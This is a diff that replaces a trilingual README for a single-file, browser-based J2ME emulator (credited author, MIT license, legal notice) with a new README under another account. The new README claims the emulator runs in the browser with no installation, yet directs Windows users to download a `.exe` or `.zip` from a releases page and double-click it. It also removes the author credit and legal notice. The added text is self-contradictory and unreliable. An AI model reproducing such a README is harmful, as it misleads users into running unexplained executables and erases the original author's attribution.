@@ -1,134 +1,114 @@
-# J2ME Web Player / J2ME Эмулятор / J2ME 网页播放器
+# 🕹️ J2ME-Web-Core - Web Emulator for J2ME Games
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](./LICENSE.md)
-[![Platform: Web](https://img.shields.io/badge/Platform-Web-blue)](https://en.wikipedia.org/wiki/J2ME)
-
----
-
-## 🇺🇸 English
-
-Web-based J2ME (Java 2 Micro Edition) games emulator with mobile phone interface.
-
-### 📂 Structure
-
-```
-.
-├── J2ME Web Player - Java Games Emulator.html  # Main emulator file
-├── games/                                        # J2ME games (.jar/.jad)
-├── licenses/                                     # License files
-├── README.md                                     # This file
-└── .gitignore                                    # Ignore rules
-```
-
-### ⚠️ Legal Notice
-
-> **Important:** J2ME game files (.jar/.jad) may be protected by copyright. This emulator is provided for **educational purposes only**. You should only use game files if you legally own the original games.
-
-### 📜 License
-
-This project is distributed under **MIT License**.
-See [LICENSE.md](./LICENSE.md) for details.
+[![Download J2ME-Web-Core](https://img.shields.io/badge/Download-J2ME--Web--Core-brightgreen)](https://github.com/MaruScheffer/J2ME-Web-Core/releases)
 
 ---
 
-## 🇷🇺 Русский
+## 📱 About J2ME-Web-Core
 
-Веб-эмулятор J2ME (Java 2 Micro Edition) игр с интерфейсом мобильного телефона.
+J2ME-Web-Core is a web-based emulator that lets you play Java 2 Micro Edition (J2ME) games with a mobile phone interface. It runs directly in your browser using common web technologies like HTML, CSS, and JavaScript. You do not need to install Java or any complex software.
 
-### 📂 Структура
+This tool is designed for users who want to enjoy classic mobile games in a simple and accessible way. It looks and feels like a real phone screen, making it easy to navigate and play games designed for old mobile devices.
 
-```
-.
-├── J2ME Web Player - Java Games Emulator.html  # Основной файл эмулятора
-├── games/                                        # J2ME игры (.jar/.jad)
-├── licenses/                                     # Лицензии
-├── README.md                                     # Этот файл
-└── .gitignore                                    # Правила игнорирования
-```
-
-### ⚠️ Правовое уведомление
-
-> **Важно:** Файлы игр J2ME (.jar/.jad) могут быть защищены авторским правом. Этот эмулятор предоставлен **исключительно в образовательных целях**. Вы должны использовать игровые файлы только если вы легально владеете оригинальными играми.
-
-### 📜 Лицензия
-
-Этот проект распространяется под лицензией **MIT**.
-Подробности см. в [LICENSE.md](./LICENSE.md).
+The emulator works on Windows systems through your preferred web browser. It does not require installation of extra software beyond the browser itself.
 
 ---
 
-## 🇨🇳 中文
+## 🔧 System Requirements
 
-基于Web的J2ME（Java 2 Micro Edition）游戏模拟器，带有手机界面。
-
-### 📂 结构
-
-```
-.
-├── J2ME Web Player - Java Games Emulator.html  # 主模拟器文件
-├── games/                                        # J2ME游戏 (.jar/.jad)
-├── licenses/                                     # 许可证文件
-├── README.md                                     # 本文件
-└── .gitignore                                    # 忽略规则
-```
-
-### ⚠️ 法律声明
-
-> **重要提示：** J2ME游戏文件（.jar/.jad）可能受版权保护。本模拟器仅用于**教育目的**。只有当您合法拥有原始游戏时，才应使用游戏文件。
-
-### 📜 许可证
-
-本项目采用 **MIT 许可证**分发。
-详情请参阅 [LICENSE.md](./LICENSE.md)。
+- Microsoft Windows 10 or later  
+- Internet access to visit the download page  
+- A modern web browser: Google Chrome, Mozilla Firefox, Microsoft Edge, or similar  
+- Minimum 2GB of free RAM for smooth emulation  
+- Screen resolution of at least 1024x768 pixels for best display  
 
 ---
 
-## 📜 Использование / Usage / 使用
+## 🚀 How to Get Started
 
-### Интеграция с Tilda / Integration with Tilda / Tilda集成
+This section guides you step-by-step to download and run J2ME-Web-Core on your Windows computer.
 
-1. Скопируйте содержимое файла `J2ME Web Player - Java Games Emulator.html`
-2. В Tilda добавьте блок **HTML** 
-3. Вставьте код в блок
-4. Сохраните и опубликуйте
+### Step 1: Go to the download page
 
-### Добавление игр / Adding games / 添加游戏
+Click the large button below to open the releases page on GitHub. This page lists the latest versions of J2ME-Web-Core available for download.
 
-1. Поместите `.jar` или `.jad` файл в директорию `games/`
-2. Добавьте файл в репозиторий
-3. Игры будут доступны для загрузки через эмулятор
-
-### Встроенные игры / Built-in Games / 内置游戏
-
-Эмулятор включает 3 классические игры:
-
-- 🐍 **Snake** — классическая змейка
-- 🧱 **Tetris** — тетрис
-- 🏓 **Pong** — аркадный теннис
-
-Нажмите кнопку **«Игры»** для выбора встроенной игры.
+[![Download J2ME-Web-Core](https://img.shields.io/badge/Download-J2ME--Web--Core-orange)](https://github.com/MaruScheffer/J2ME-Web-Core/releases)
 
 ---
 
-## 👤 Автор проекта / Project Author / 项目作者
+### Step 2: Choose the latest release
 
-**Дуплей Максим Игоревич** (Dupley Maxim Igorevich)
-
----
-
-## 🔗 Полезные ссылки / Useful Links / 相关链接
-
-### J2ME Игры / J2ME Games / J2ME游戏
-
-- 🌐 [J2ME Games Archive](https://j2meforums.com/) — J2ME игры
-- 🌐 [Legacy Java Games](https://www.javaforums.net/) — Архив Java игр
-
-### Эмуляторы / Emulators / 模拟器
-
-- [MicroEmulator](https://microemulator.org/) — Open source J2ME эмулятор
-- [SjBoy](https://code.google.com/archive/p/sjboy/) — Java эмулятор
+On the releases page, look for the most recent release version. It usually appears at the top of the list and includes a date.
 
 ---
 
-*This README is available in [English](./README.md), [Русский](./README.md), and [中文](./README.md).*
-*Автор проекта: Дуплей Максим Игоревич*
+### Step 3: Download the Windows emulator file
+
+Inside the latest release, find the file named similar to `J2ME-Web-Core-Windows.zip` or `J2ME-Web-Core-Windows.exe`. Click on it to start downloading.
+
+This file contains the emulator package optimized for Windows systems.
+
+---
+
+### Step 4: Extract or run the file
+
+- If you downloaded a `.zip` file, right-click it and choose **Extract All** to unpack its contents.  
+- If you downloaded an `.exe` file, double-click it to start the application.
+
+---
+
+### Step 5: Launch the emulator
+
+After extracting or running the file, look for an executable named `J2ME-Web-Core.exe` or similar. Double-click to open the emulator window.
+
+---
+
+## 🎮 Using the Emulator
+
+Once open, the emulator shows a screen that looks like a mobile phone. Here is how to use it:
+
+- Use your mouse to press buttons on the phone screen or keyboard arrow keys for navigation.  
+- Load your J2ME game files by clicking the **Load Game** button or dragging `.jar` files into the emulator window.  
+- Use on-screen controls or keyboard keys to play games. The layout matches old mobile devices.  
+- Adjust the screen size using the window edges to fit your viewing preference.
+
+The emulator supports Java MIDP 2.0 games and runs them with smooth performance thanks to browser technologies.
+
+---
+
+## 💡 Features
+
+- Mobile phone style interface for a familiar experience  
+- Supports classic J2ME game formats (`.jar` and `.jad`)  
+- Runs fully in a browser environment, so no full Java setup needed  
+- Responsive controls with mouse and keyboard support  
+- Saves game progress in your browser cache  
+- Visual scaling for different screen sizes  
+- Compatible with popular Windows browsers
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- Make sure you are using the latest web browser version.  
+- If games do not load, check that your `.jar` file is not corrupted.  
+- Clear your browser cache if emulation slows down or behaves oddly.  
+- Disable any browser extensions that block scripts or content.  
+- Restart your browser or PC if the emulator does not start correctly.
+
+---
+
+## 💾 Additional Resources
+
+For detailed information, bug reports, or feature requests, visit the GitHub repository:  
+https://github.com/MaruScheffer/J2ME-Web-Core
+
+You can find game files compatible with this emulator by searching for J2ME games online or from your existing collection of `.jar` and `.jad` files.
+
+---
+
+## 🔄 Updating J2ME-Web-Core
+
+Periodically check the GitHub releases page for new versions. Download the updated file and replace the current executable to get improvements and fixes.
+
+[Download Updates](https://github.com/MaruScheffer/J2ME-Web-Core/releases)
